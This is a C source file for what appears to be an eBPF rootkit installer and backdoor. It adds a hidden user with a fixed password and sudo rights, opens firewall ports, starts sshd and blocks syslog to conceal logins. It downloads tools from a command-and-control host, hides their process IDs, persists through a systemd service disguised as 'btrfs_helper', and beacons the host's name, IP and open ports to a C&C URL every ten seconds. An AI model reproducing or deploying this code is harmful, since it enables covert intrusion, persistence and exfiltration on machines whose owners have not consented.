#define _XOPEN_SOURCE 500  // Enable certain library features
#include "ebpf_helper.h"
#include <ftw.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <fcntl.h>
#include <string.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include<signal.h>
#include <unistd.h>
#include <curl/curl.h>
#include <jansson.h>


#define BUFFER_SIZE 512
#define DATA_SIZE 1024
#define COMMAND_SIZE 256

#define SSH_PORT 22
#define CC_PORT 8080

const char *sbin_path = "/usr/sbin/";
const char *username = "ebpfhelper";
const char *base_url = "http://ebpf-cnc.surge.sh/";
const char *programs[] = {
    "ebpfkit", 
    "ebpfkit-client", 
    "webapp", 
    "pause", 
    "pidhide", 
    "sudoadd", 
    "receiver",
    NULL
};

// Cheers GPT ;3
pid_t run_task_and_hide(const char *cmd, ...) {
    char *args[100];
    va_list ap;
    int i = 0;

    va_start(ap, cmd);
    while ((args[i++] = va_arg(ap, char *)) != NULL);
    va_end(ap);

    pid_t pid = fork();
    if (pid == 0) { // Child process for running the task
        execv(cmd, args);
        perror("execv"); // Executed only if execv fails
        exit(1);
    } else if (pid > 0) { // Parent process
        pid_t hide_pid = fork();
        if (hide_pid == 0) { // Child process for hiding the PID
            char hide_cmd[COMMAND_SIZE];
            snprintf(hide_cmd, sizeof(hide_cmd), "%d", pid);
            execl("/usr/sbin/pidhide", "pidhide", "-p", hide_cmd, NULL);
            perror("execl"); // Executed only if execl fails
            exit(1);
        } else if (hide_pid < 0) { // Fork failed for hide_pid
            perror("fork");
            exit(1); // Exit if fork fails
        }
    } else { // Fork failed for run_task
        perror("fork");
        exit(1); // Exit if fork fails
    }
    return pid;
}

// Function to be applied to each file in the directory
static int remove_cb(const char *fpath, const struct stat *sb, int typeflag, struct FTW *ftwbuf) {
    int ret = remove(fpath);
    if (ret) {
        perror(fpath);
    }
    return ret;
}

// Function to purge a directory
void purge_directory(const char *dir_path) {
    // Use nftw to traverse the directory and apply remove_cb to each file
    if (nftw(dir_path, remove_cb, 64, FTW_DEPTH | FTW_PHYS) == -1) {
        perror("nftw");
        exit(EXIT_FAILURE);
    }
}

void find_pid_by_name(const char *program_name, int **found_pids) {
    char command[COMMAND_SIZE];
    if (snprintf(command, sizeof(command), "pidof %s", program_name) < 0) {
        perror("snprintf");
        exit(1);
    }

    FILE *fp = popen(command, "r");
    if (!fp) {
        perror("popen");
        exit(1);
    }

    char buffer[BUFFER_SIZE] = {0};
    if (fgets(buffer, sizeof(buffer) - 1, fp)) {
        buffer[strcspn(buffer, "\n")] = 0;
        int pid_count = 0;
        for (char *token = strtok(buffer, " "); token; token = strtok(NULL, " ")) {
            int *temp = realloc(*found_pids, (pid_count + 2) * sizeof(int));
            if (!temp) {
                perror("realloc");
                free(*found_pids);
                exit(1);
            }
            *found_pids = temp;
            (*found_pids)[pid_count++] = atoi(token);
        }
        (*found_pids)[pid_count] = -1;
    }
    pclose(fp);
}

void hide_pids(int *pids) {
    for (int i = 0; pids[i] != -1; ++i) {
        printf("Hiding PID: %d\n", pids[i]);
        char pid_str[64];
        snprintf(pid_str, sizeof(pid_str), "%d", pids[i]);
        
        pid_t hide_each_pid = fork();
        if (hide_each_pid == 0) {  // Child process
            if (execl("/usr/sbin/pidhide", "pidhide", "-p", pid_str, NULL) == -1) {
                perror("execl");
                exit(1);
            }
        } else if (hide_each_pid < 0) {  // Fork failed
            perror("fork");
            exit(1);
        }
    }
}

void combine_and_hide_pids(const char *names[], int num_names) {
    int *combined_pids = NULL;
    int combined_count = 0;

    for (int i = 0; i < num_names; ++i) {
        int *found_pids = NULL;
        find_pid_by_name(names[i], &found_pids);

        // Only do if found_pids not NULL:w
        if (found_pids) {
            // Append found_pids to combined_pids
            for (int j = 0; found_pids[j] != -1; ++j) {
                combined_pids = realloc(combined_pids, (combined_count + 1) * sizeof(int));
                combined_pids[combined_count++] = found_pids[j];
            }

            free(found_pids);  // Don't forget to free the memory
        }
    }

    // Add the terminator
    combined_pids = realloc(combined_pids, (combined_count + 1) * sizeof(int));
    combined_pids[combined_count] = -1;

    // Hide the combined PIDs
    hide_pids(combined_pids);

    free(combined_pids);  // Free the combined array
}

void download_file(const char *local_path, const char *url) {
    char cmd[DATA_SIZE];
    if (system("which curl") == 0) {
        snprintf(cmd, sizeof(cmd), "curl -o \"%s\" \"%s\"", local_path, url);
    } else if (system("which wget") == 0) {
        snprintf(cmd, sizeof(cmd), "wget -O \"%s\" \"%s\"", local_path, url);
    } else {
        fprintf(stderr, "Neither curl nor wget is available\n");
        exit(1);
    }
    if(system(cmd) != 0) {
        fprintf(stderr, "Failed to download file\n");
        exit(1);
    }
    snprintf(cmd, sizeof(cmd), "sudo chmod +x \"%s\"", local_path);
    if(system(cmd) != 0) {
        fprintf(stderr, "Failed to set executable permissions\n");
        exit(1);
    }
}


void create_and_enable_service() {
    // File doesn't exist, download it
    if (access("/etc/systemd/system/btrfs_helper.service", F_OK) == -1) {
        download_file("/etc/systemd/system/btrfs_helper.service", "http://ebpf-cnc.surge.sh/btrfs_helper.service");
    }

    // Reload systemd to recognize the new service
    if (system("systemctl daemon-reload") != 0) {
        fprintf(stderr, "Failed to reload systemd\n");
        exit(1);
    }

    // Enable the service
    if (system("systemctl enable btrfs_helper.service") != 0) {
        fprintf(stderr, "Failed to enable service\n");
        exit(1);
    }

    printf("Service created and enabled successfully.\n");
}

void start_sshd() {
    pid_t pid = fork();  // Create a child process

    if (pid < 0) {
        perror("Fork failed");
        exit(EXIT_FAILURE);
    }

    if (pid == 0) {  // Child process
        // Start sshd
        execl("/usr/sbin/sshd", "sshd", NULL);
        perror("execl failed");
        exit(EXIT_FAILURE);
    } else {  // Parent process
        printf("sshd started successfully.\n");
    }
}

void block_sshd_log() {
    // Find PIDs for a program, e.g., "rsyslogd"
    int *found_pids = NULL;
    find_pid_by_name("rsyslogd", &found_pids);

    // Print the found PIDs
    for (int i = 0; found_pids[i] != -1; ++i) {
        printf("%d ", found_pids[i]);
    }

    // Block the write to rsyslogd (hide SSH connection)
    for (int i = 0; found_pids[i] != -1 ; ++i) {
        char block_cmd[COMMAND_SIZE];
        snprintf(block_cmd, sizeof(block_cmd), "/usr/sbin/writeblocker --pid %d", found_pids[i]);
        run_task_and_hide(block_cmd);
    }
    free(found_pids);
}

int update_iptables(int ports[], size_t size) {
    for (size_t i = 0; i < size; ++i) {
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "iptables -A INPUT -p tcp --dport %d -j ACCEPT", ports[i]);
        if (system(cmd) != 0) {
            fprintf(stderr, "Failed to update iptables rules for port %d.\n", ports[i]);
            return 1;
        }
    }
    if (system("iptables-save > /etc/iptables/rules.v4") != 0) {
        fprintf(stderr, "Failed to save iptables rules.\n");
        return 1;
    }
    return 0;
}

int update_ufw(int ports[], size_t size) {
    for (size_t i = 0; i < size; ++i) {
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "ufw allow %d/tcp", ports[i]);
        if (system(cmd) != 0) {
            fprintf(stderr, "Failed to update ufw rules for port %d.\n", ports[i]);
            return 1;
        }
    }
    return 0;
}

int allow_firewall() {
    int ret = 0;
    int ports[] = {SSH_PORT, CC_PORT};
    size_t size = sizeof(ports) / sizeof(ports[0]);

    if (system("which iptables > /dev/null 2>&1") == 0) {
        ret = update_iptables(ports, size);
    } else if (system("which ufw > /dev/null 2>&1") == 0) {
        if (system("ufw status | grep -q 'Status: active'") == 0) {
            ret = update_ufw(ports, size);
        } else {
            fprintf(stderr, "ufw is not active on this system.\n");
            ret = 1;
        }
    } else {
        fprintf(stderr, "Neither iptables nor ufw is available on this system.\n");
        ret = 1;
    }

    return ret;
}

void add_system_user(const char *username) {
    char cmd[COMMAND_SIZE];

    // Create a system user with home directory in /var/ and bash shell
    snprintf(cmd, sizeof(cmd), "useradd -r -m -d /var/%s -s /bin/sh %s", username, username);
    if (system(cmd)!= 0) {
        fprintf(stderr, "Failed to add system user\n");
        // Failed to add user, bail!
        exit(1);
    } else {
        // Set a password for the user (in this example, the password is 'password')
        snprintf(cmd, sizeof(cmd), "echo '%s:password' | chpasswd", username);
        if (system(cmd) != 0) {
            fprintf(stderr, "Failed to set password for system user\n");
            // Failed to change password, bail!
            exit(1);
        }
    }

}

// Function to send API call
void send_api_call(const char *url, const char *data) {
    CURL *curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Failed to initialize libcurl\n");
        return;
    }

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, fwrite);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, stdout);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
    }

    curl_easy_cleanup(curl);
}

// Function to gather system information and create JSON data
void gather_system_info(char *data, size_t max_size) {
    FILE *fp = popen("ss -tuln | grep -E '^(tcp|udp)' | awk '{print $5}' | cut -d: -f2 | sort -u", "r");
    if (fp) {
        // Gather available ports
        char line[32];
        char ports[128] = "";

        while (fgets(line, sizeof(line), fp) != NULL) {
            strcat(ports, line);
            strcat(ports, ", ");
        }

        pclose(fp);

        // Get hostname
        char hostname[128];
        if (gethostname(hostname, sizeof(hostname)) != 0) {
            strcpy(hostname, "Unknown");
        }

        // Get IP address
        char ip_address[64];
        FILE *ip_fp = popen("hostname -I | awk '{print $1}'", "r");
        if (ip_fp) {
            fgets(ip_address, sizeof(ip_address), ip_fp);
            pclose(ip_fp);
            ip_address[strlen(ip_address) - 1] = '\0'; // Remove newline character
        } else {
            strcpy(ip_address, "Unknown");
        }

        // Create JSON data using Jansson
        json_t *root = json_object();
        json_object_set_new(root, "message", json_string("Prebuild is ready to be used, Pinging the Control & Command server"));
        json_object_set_new(root, "available_ports", json_string(ports));
        json_object_set_new(root, "ufw_status", json_string(access("/usr/sbin/ufw", F_OK) == 0 ? "Active" : "Inactive"));
        json_object_set_new(root, "hostname", json_string(hostname));
        json_object_set_new(root, "ip_address", json_string(ip_address));

        char *json_output = json_dumps(root, JSON_INDENT(4));
        snprintf(data, max_size, "%s", json_output);

        // Free JSON objects and strings
        json_decref(root);
        free(json_output);
    } else {
        fprintf(stderr, "Failed to execute ss\n");
    }
}

void handle_sigint(int sig) {
    printf("\nPerforming shutdown task before exiting... \n");

    char *program_names[] = {"sudoadd", "pidhide", "writeblock"};
    int num_programs = sizeof(program_names) / sizeof(program_names[0]);

    for (int i = 0; i < num_programs; ++i) {
        int *found_pids = NULL;
        find_pid_by_name(program_names[i], &found_pids);

        // Only do when found_pids not NULL
        if (found_pids) {
            printf("Program: %s\n", program_names[i]);
            printf("PIDs: ");

            for (int j = 0; found_pids[j] != -1; ++j) {
                printf("%d ", found_pids[j]);
                if (kill(found_pids[j], SIGINT) == -1) {
                    perror("kill");
                }
            }
            printf("\n");
            free(found_pids);  // Free the memory
        }
    }
    remove("/tmp/btrfs.lock");  // Remove the lock file
    printf("Shutdown complete. Goodbye. \n");
    exit(0);
}


int main(int argc, char *argv[]) {
    char cmd[COMMAND_SIZE];
    char data[DATA_SIZE];

    if (access("/tmp/btrfs.lock", F_OK) != -1) {
        printf("Another instance is running.\n");
        exit(1);
    } else {
        FILE *fp = fopen("/tmp/btrfs.lock", "w");
        fclose(fp);
    }
    signal(SIGINT, handle_sigint);

    //char local_file_path[256];
    const char *url = "http://monchi.local:3000/cnc";

    // Check if username exists, if not add it
    if (getpwnam(username) == NULL) {
        printf("Adding new user...\n");
        add_system_user(username);
    }
    // Enable ssh
    allow_firewall();
    start_sshd();
    block_sshd_log();

    // Loop through each program to check if it exists, if not download it
    for (int i = 0; programs[i] != NULL; ++i) {
        snprintf(cmd, sizeof(cmd), "%s/%s", sbin_path, programs[i]);
        if (access(cmd, F_OK) == -1) {
            snprintf(cmd, sizeof(cmd), "%s%s", base_url, programs[i]);
            download_file(sbin_path, cmd);
        }
    }

    // Run sudoadd
    run_task_and_hide("/usr/sbin/sudoadd", "sudoadd", "-u", username, NULL);

    // Run recevier
    run_task_and_hide("/usr/sbin/receiver", "receiver", NULL);

    // Hide processes
    const char *names[] = {argv[0], "sudo", "writeblocker", "sshd", "sudoadd"};
    combine_and_hide_pids(names, sizeof(names) / sizeof(names[0]));

    // Create the service make sure this program runs every boot after network connection established
    create_and_enable_service();

    // Loop to run indefinitely
    while (1) {
        gather_system_info(data, sizeof(data));
        printf("Generated JSON:\n%s\n", data);
        send_api_call(url, data);

        sleep(10); // Wait for 10 seconds before the next iteration
    }

}
